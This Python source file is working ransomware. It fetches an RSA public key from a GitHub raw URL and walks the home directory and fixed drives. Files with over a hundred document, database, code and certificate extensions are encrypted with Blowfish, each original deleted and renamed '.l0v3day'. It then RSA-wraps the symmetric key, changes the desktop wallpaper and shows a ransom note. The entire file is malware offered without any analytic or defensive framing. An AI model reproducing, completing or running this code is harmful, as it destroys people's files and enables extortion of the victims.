import os
import sys
import time
import ctypes
import psutil
from struct import pack
from requests import get
from Crypto.PublicKey import RSA
from Crypto.Cipher import Blowfish
from Crypto.Cipher import PKCS1_v1_5
from modules.DisplayNote import display_ransom_note
from modules.SetDesktopWall import change_wallpaper


class Crypter:

    def __init__(self) -> None:
        self.key = None
        self.enc_ext = ".l0v3day"
        self.publicKey = "RSA_PublicKey.pub"
        self.BlowFishKeyFile = "symetric_key.key"
        self.FetchPublicKey()

    # check if running as admin
    def IsAdmin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    # fetch public key from the server
    def FetchPublicKey(self):
        url = "https://raw.githubusercontent.com/Casanova5065/image/main/RSA_PublicKey.pub"
        k = get(url).content
        with open(self.publicKey, "wb") as keyFile:
            keyFile.write(k)

        # generate a random 16-byte random encryption
    def CryptGenKey(self):
        self.key = os.urandom(16)
        return self.key

    # read the public key that will be used to encrypt symetric key
    def ReadPublicKey(self):
        with open(self.publicKey, "rb") as pubKey:
            PublicKey = pubKey.read()
            print(f"Reading key from {os.path.abspath(self.publicKey)}")
            return PublicKey

    # Write encrypted Blowfish key to file
    def WriteEncryptedKey(self, PublicKey):
        rsa = RSA.importKey(PublicKey)
        cipher = PKCS1_v1_5.new(rsa)
        encrypted_key = cipher.encrypt(self.key)

        with open(self.BlowFishKeyFile, "wb") as symKey:
            symKey.write(encrypted_key)
        # os.remove(self.publickey.key)

    # read data from target file in bytes
    def readTargetFile(self, filename):
        with open(filename, "rb") as inputFile:
            content = inputFile.read()
            return content

    # write encrypted data to file in bytes
    def writeTargetFile(self, filename, data):
        with open(filename, "wb") as outFile:
            outFile.write(data)

    def Encrypt(self, targetFile):
        key = self.key
        bs = Blowfish.block_size
        cipher = Blowfish.new(key, Blowfish.MODE_ECB)
        raw_data = self.readTargetFile(targetFile)
        plen = bs - len(raw_data) % bs
        padding = [plen]*plen
        padding = pack('b'*plen, *padding)
        encrypted_data = cipher.encrypt(raw_data + padding)
        self.writeTargetFile(targetFile+self.enc_ext, encrypted_data)
        os.remove(targetFile)

    def LocateFiles(self, root_dir, extensions):
        found_files = []
        exclusion = os.path.dirname(sys.executable)

        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                for ext in extensions:
                    if filename.endswith(ext):
                        full_path = os.path.join(dirpath, filename)
                        if exclusion not in full_path:
                            found_files.append(full_path)
                        else:
                            continue

        return found_files

    def get_hard_drive_info(self):
        hard_drives = []
        for partition in psutil.disk_partitions():
            if "cdrom" not in partition.opts.lower() and "removable" not in partition.opts.lower():
                hard_drives.append(partition.mountpoint)
        return hard_drives

def Init(drives):
    for drive in drives:
        files = crypt.LocateFiles(drive, file_extensions)

        for file in files:
            try:
                if file != crypt.publicKey and file != crypt.BlowFishKeyFile:
                    os.access(file, os.R_OK | os.W_OK)
                    crypt.Encrypt(file)
                    print(file)
                else:
                    continue
            except:
                print("Cannot access")

if __name__ == '__main__':

    crypt = Crypter()

    file_extensions = [
        ".docx", ".doc", ".xlsx", ".xls", ".pptx", ".ppt", ".pdf", ".txt", ".jpg",
        ".jpeg", ".png", ".gif", ".mp3", ".wav", ".avi", ".mp4", ".zip", ".rar",
        ".7z", ".tar", ".gz", ".sql", ".accdb", ".mdb", ".dbf", ".odb", ".pst", ".ost",
        ".msg", ".eml", ".pem", ".pfx", ".key", ".crt", ".csr", ".p12", ".der",
        ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd",
        ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp",
        ".php", ".asp", ".rb", ".java", ".jar", ".class", ".svg", ".ai", ".psd",
        ".nef", ".tiff", ".tif", ".cgm", ".raw", ".djvu", ".hwp", ".snt", ".onetoc2",
        ".dwg", ".sxi", ".sti", ".vsdx", ".vsd", ".edb", ".pot", ".potx", ".ppam",
        ".ppsx", ".ppsm", ".pps", ".dot", ".dotx", ".dotm", ".sxc", ".stc", ".dif",
        ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
        ".mml", ".lay", ".lay6", ".jfif",
    ]
    root_directory = os.path.expanduser("~")

    # generate symetric encryption key
    EncryptionKey = crypt.CryptGenKey()

    # read RSA public key used for encryption of blowfish key and delete it
    PubKey = crypt.ReadPublicKey()

    # system drive information
    drives = crypt.get_hard_drive_info()
    drives = drives[::-1][:-1]

    if crypt.IsAdmin():
        # start encryption
        print("Admin detected")

        Init(drives)

        files = crypt.LocateFiles(root_directory, file_extensions)

        for file in files:
            try:
                if file != crypt.publicKey and file != crypt.BlowFishKeyFile:
                    os.access(file, os.R_OK | os.W_OK)
                    crypt.Encrypt(file)
                    print(file)
                else:
                    continue
            except:
                print("Cannot access")


        time.sleep(5)
        # write encrypted key to file
        crypt.WriteEncryptedKey(PubKey)
        change_wallpaper()
        display_ransom_note()